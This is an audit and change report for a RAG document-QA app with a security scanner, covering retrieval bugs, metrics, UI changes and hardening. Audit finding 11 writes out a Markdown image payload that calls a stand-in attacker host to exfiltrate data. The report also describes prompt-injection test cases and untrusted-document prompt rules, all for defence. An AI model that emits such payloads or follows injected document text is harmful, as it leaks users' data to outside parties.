# TrustGuard AI Phase 4 → 4.1: audit and change report

## 1. Audit of Phase 4 (single `app.py`, 733 lines)

**Bugs and weaknesses found**
1. **BM25 ranking wrong on small corpora.** Stock `BM25Okapi` gives negative IDF to terms found in more than half the chunks. Measured: a one-chunk corpus scored a perfect keyword match at **-0.549**; a two-chunk corpus scored the matching chunk **0.0**, identical to a non-match.
2. **BM25-only search returned chunks with no keyword match** (score 0) as if they were results, and hybrid RRF gave them BM25 rank credit.
3. **Phase 3 precision inconsistent with its own documentation:** numerator counted distinct pages, denominator counted chunks. MRR ranked chunks, not pages.
4. **Stale state:** the previous answer and its faithfulness result stayed after the document set changed; a faithfulness result from answer A was shown beside answer B; removing the uploader's files left the old index active while the UI said "Upload to begin".
5. **Phase 3 chart title used the current slider**, not the `k` the results were computed with; results never marked stale.
6. **Eval CSV from Excel/Numbers failed** (UTF-8 BOM turned `question` into `\ufeffquestion`); labels pointing at non-existent files/pages silently scored 0.
7. **Misleading reliability numbers:** evidence overlap counted stopwords ("the", "of"), citation "coverage" only counted marker count vs 3, evidence-only answers were hard-coded to 100% citation coverage (the answer *is* the evidence), "Top retrieval score" mixed three incomparable scales.
8. **Faithfulness judge:** no claims ⇒ score 1.0 "High support"; `"true"` (string) counted as unsupported; judge prompt did not mark the answer as untrusted.
9. **Duplicate security events:** scanning overlapping chunks logged the same phrase repeatedly; phrases split by a PDF line break were missed (no whitespace normalisation).
10. **Rule flags:** `AKIA…` matched lower-case strings because every rule used `IGNORECASE`.
11. **Markdown rendering of untrusted text:** LLM output / PDF text rendered with `st.markdown` could include `![](https://attacker/?data=…)`, which the browser fetches automatically (data-exfiltration channel).
12. **CSV exports** were open to spreadsheet formula injection via filenames/questions.
13. **Reliability/robustness:** SQLite connections never closed, DB errors crashed the app; connection and timeout errors were not distinguished from a missing model, and an empty Ollama reply silently became "evidence-only"; no PDF header/encryption/empty/image-only checks; `import fitz` is deprecated in current PyMuPDF; every upload re-embedded all documents; the query was re-embedded once per method in Phase 3; `use_container_width` is deprecated in new Streamlit.

## 2. What changed

**Preserved unchanged:** all six sections; Sentence Transformers/FAISS/BM25/RRF/Ollama pipeline; evidence-only fallback; sources with filename + page; all 11 scanner patterns (verbatim); SQLite schema, existing records and content-hash approach; Precision@k/Recall@k/MRR and the 3-method comparison; the original five Security Lab cases and PASS/REVIEW logic; all CSV exports; upload limits.

**Structure (modest refactor, not a rewrite):** `app.py` is now a router; logic split into `trustguard/` modules and one `views/` module per page. Same command to run.

**UI/UX:** navy sidebar with branding, grouped navigation, active-page highlight, Ollama status indicator, model toggle, footer; light content area, violet accent, rounded cards, styled Plotly charts, responsive CSS; empty states throughout. Dashboard (formerly *Evaluation Dashboard*): KPI cards, recent activity, quick actions and charts, all from SQLite/session state (nothing hard-coded). Document Q&A: drag-and-drop upload, per-file validation messages, document cards (size, pages, chunks, status, findings), per-document and bulk remove, progress status, suggested questions, clear conversation, answer card with mode badge, question history, evidence cards with query-term highlighting and score bars, **clickable source buttons that open the real PDF page rendered with PyMuPDF with the retrieved text highlighted** (best-effort text match; the page image is always real).

**Security Monitor:** overview metrics, tabs for scan / event log / rules; severity icons, type filter, text search, event inspector, scan history, formula-safe CSV; findings explain *what matched, why it was flagged, rule ID, severity meaning, possible false positives*, and are labelled "potential finding (pattern match, not confirmed)". Rule IDs and `Low` severity for plain email addresses were added (other severities unchanged).

**RAG:** PDF validation (header, corrupt, encrypted, empty, image-only, partly scanned); sentence-aware chunk boundaries and a minimum chunk size; embeddings cached per document (add/remove without re-embedding); query scores cached across methods; positive-IDF BM25 and match-only BM25; system/user prompt separation with delimited, tag-neutralised excerpts and explicit "documents are untrusted" rules; conservative insufficient-evidence gate (`MIN_EVIDENCE_COSINE=0.10` with no keyword hit; an uncalibrated threshold); separate connect/read timeouts, specific messages for not running / model missing / timeout / empty / malformed.

**Reliability metrics:** renamed and redefined as described in the README; new citation-validity check and "answer words not found in evidence" list; explanation panel in the UI; evidence-only answers are marked not applicable.

**Evaluation labs:** CSV validation with row-level messages, progress bar, summary cards, methods-disagree table, stale-results warning. Security Lab now has 15 cases in three groups, including two **Known limitation** cases that currently show REVIEW by design (paraphrased and character-spaced injections). The PASS count is therefore not inflated.

**Hardening:** Markdown image/link neutralisation, HTML escaping in all custom HTML, CSV formula neutralisation, whole-page scanning with one event per file per rule, no document text in the log.

**Files:** modified `app.py`, `requirements.txt`, `README.md`, `.gitignore`; new `trustguard/*`, `views/*`, `tests/*`, `.streamlit/config.toml`, `pytest.ini`, `requirements-dev.txt`, this file and `TESTING.md`. `trustguard_eval_template.csv` unchanged. Streamlit minimum raised 1.38 → 1.40 (`st.image(use_container_width=…)` is used for the page preview); PyMuPDF ≥ 1.24.3 for the `pymupdf` import name.

## 3. Behaviour changes you should know about
- Phase 3 numbers can differ from Phase 4 runs on the same data (precision/MRR now page-level as documented; BM25 scores/ranks differ slightly because of the IDF change).
- BM25-only search can return fewer than k results, or none.
- Page-less fragments under 30 characters are no longer indexed.
- Output scanning now applies to LLM answers, not to evidence-only excerpts (those are document text, already scanned at upload).
- A different file with an already-indexed filename is rejected (citations and eval labels use filenames).

## 4. Remaining limitations
Regex security rules are easily bypassed; reliability signals are heuristics; the claim-support judge is a small local model; no OCR; index not persisted across restarts; PDF text extraction on tables/multi-column layouts can be poor; no authentication or rate limiting; session memory holds the PDF bytes (up to the per-batch limits, but repeated uploads are not capped); the insufficient-evidence and low-overlap thresholds are uncalibrated.

## 5. Future recommendations (only those with clear value)
1. Build a labelled evaluation set (15–30 questions) and calibrate `MIN_EVIDENCE_COSINE` / `LOW_OVERLAP_THRESHOLD` on it.
2. Add OCR (e.g. Tesseract) for scanned PDFs.
3. Persist the index on disk keyed by file hash.
4. Add a cross-encoder reranker and compare it in the Phase 3 lab.
5. Manually audit a sample of claim-support judgements to report the judge's own error rate.
